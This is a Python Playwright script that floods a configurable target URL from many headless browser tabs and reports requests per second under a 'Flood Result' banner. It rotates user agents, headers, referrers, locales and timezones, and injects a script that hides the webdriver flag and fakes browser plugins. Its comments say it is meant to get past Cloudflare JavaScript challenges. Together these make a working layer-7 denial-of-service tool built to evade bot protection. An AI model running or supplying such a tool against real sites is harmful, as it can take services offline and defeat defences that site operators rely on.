import asyncio
import random
import time
import os
from playwright.async_api import async_playwright

TARGET_URL = os.getenv("TARGET_URL", "https://example.com/")
DURATION = int(os.getenv("DURATION", "20"))   # seconds
CONCURRENCY = int(os.getenv("CONCURRENCY", "1"))  # number of tabs
REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "1"))  # navigations per loop per tab

# expanded realistic UAs
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6426.87 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]

ACCEPT_LANG = ["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9,en-US;q=0.8"]
REFERRERS = ["https://www.google.com/", "https://www.bing.com/", "https://www.facebook.com/", None]

# stats
success = 0
fail = 0
status_count = {}

# helper: realistic sec-ch-ua header based on UA
def build_sec_ch_ua(ua: str):
    if "Chrome" in ua or "Chromium" in ua or "CriOS" in ua or "Edg/" in ua:
        return '"Chromium";v="125", "Google Chrome";v="125", "Not A(Brand)";v="8"'
    if "Firefox" in ua:
        return '"Mozilla";v="125", "Firefox";v="125", "Not A(Brand)";v="8"'
    if "Safari" in ua and "Version/" in ua:
        return '"Safari";v="17", "Not A(Brand)";v="8"'
    return '"Not A(Brand)";v="8"'

# Initialization script to mask automation artifacts inside page context
INIT_SCRIPT = """
// remove webdriver flag
Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
// plugins & mimeTypes
Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3]});
Object.defineProperty(navigator, 'languages', {get: () => ['en-US','en']});
// fake permissions query for notifications etc
const _origPerm = navigator.permissions && navigator.permissions.query;
if (_origPerm) {
  navigator.permissions.query = function(p) {
    if (p && p.name === 'notifications') {
      return Promise.resolve({ state: Notification.permission });
    }
    return _origPerm(p);
  }
}
"""

async def human_like_wait(min_s=0.3, max_s=1.2):
    await asyncio.sleep(random.uniform(min_s, max_s))

async def worker(context, worker_id):
    global success, fail, status_count
    ua = random.choice(USER_AGENTS)
    sec_ch_ua = build_sec_ch_ua(ua)
    lang = random.choice(ACCEPT_LANG)
    referer = random.choice(REFERRERS)

    # create a new page (tab)
    page = await context.new_page()
    # set viewport typical for UA
    await page.set_viewport_size({"width": random.choice([1366, 1440, 1536, 1280]), "height": random.choice([768, 800, 900, 1024])})
    # set extra headers (Playwright will merge with navigator-ch headers during navigation)
    extra_headers = {
        "Accept-Language": lang,
        "Referer": referer or "",
        "Sec-CH-UA": sec_ch_ua,
        "DNT": random.choice(["1", "0"]),
        "Upgrade-Insecure-Requests": "1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
    }
    await page.set_extra_http_headers(extra_headers)

    # route: optionally allow subresources; here we let everything pass but can throttle or block fonts/images if desired
    # await page.route("**/*", lambda route: route.continue_())

    start = time.time()
    loops = 0
    while time.time() - start < DURATION:
        for _ in range(REQ_PER_LOOP):
            try:
                # perform navigation (runs JS, solves CF JS challenge if simple)
                resp = await page.goto(TARGET_URL, wait_until="networkidle", timeout=15000)
                # collect status and CF headers if present
                status = resp.status if resp else None
                headers = resp.headers if resp else {}
                cf_ray = headers.get("cf-ray", "")
                cf_cache = headers.get("cf-cache-status", "")
                # count
                if status and 200 <= status < 300:
                    success += 1
                    status_count[status] = status_count.get(status, 0) + 1
                else:
                    fail += 1
                    status_count[status or "no-status"] = status_count.get(status or "no-status", 0) + 1
                # small human-like interactions
                # maybe scroll a bit
                await page.mouse.wheel(0, random.randint(200, 800))
                await human_like_wait(0.2, 0.9)
                # maybe click a random visible link (best-effort, safe)
                try:
                    anchors = await page.query_selector_all("a[href]")
                    if anchors and random.random() < 0.2:
                        a = random.choice(anchors)
                        # sometimes clicking causes navigation; guard with timeout
                        await a.click(timeout=3000)
                        await human_like_wait(0.2, 0.6)
                        await page.go_back(timeout=5000)
                except Exception:
                    pass

            except Exception as e:
                fail += 1
                status_count["exception"] = status_count.get("exception", 0) + 1
            await human_like_wait(0.3, 1.2)

        loops += 1
        # small jitter between loops
        await human_like_wait(0.5, 2.0)

    await page.close()

async def main():
    global success, fail, status_count
    async with async_playwright() as pw:
        # launch: prefer headful for best stealth; if headless required, Playwright's headless still detectable sometimes
        browser = await pw.chromium.launch(
            headless=True,   # set False for more realistic fingerprint; change to True if running on server but less stealthy
            args=[
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-blink-features=AutomationControlled",
                "--disable-features=IsolateOrigins,site-per-process",
                # optionally set user-agent client hints behavior:
                "--enable-blink-features=IdleDetection" 
            ],
        )

        # one context shared among tabs to look like same user session
        ua_base = random.choice(USER_AGENTS)
        context = await browser.new_context(
            user_agent=ua_base,
            locale=random.choice(["en-US", "en-GB", "vi-VN", "ja-JP"]),
            timezone_id=random.choice(["Asia/Bangkok", "Europe/London", "America/Los_Angeles"]),
            java_script_enabled=True,
            # viewport will be set per-page
        )

        # inject init script to mask common Playwright artifacts
        await context.add_init_script(INIT_SCRIPT)

        # spawn workers (tabs)
        tasks = [worker(context, i) for i in range(CONCURRENCY)]
        await asyncio.gather(*tasks)

        await context.close()
        await browser.close()

    total = success + fail
    print(f"\n=== Flood Result ===")
    print(f"Total requests: {total}")
    print(f"Success (2xx): {success}")
    print(f"Fail/Blocked: {fail}")
    print(f"RPS ~ {total / max(1, DURATION):.2f}")
    print("Status breakdown:", status_count)

if __name__ == "__main__":
    asyncio.run(main())
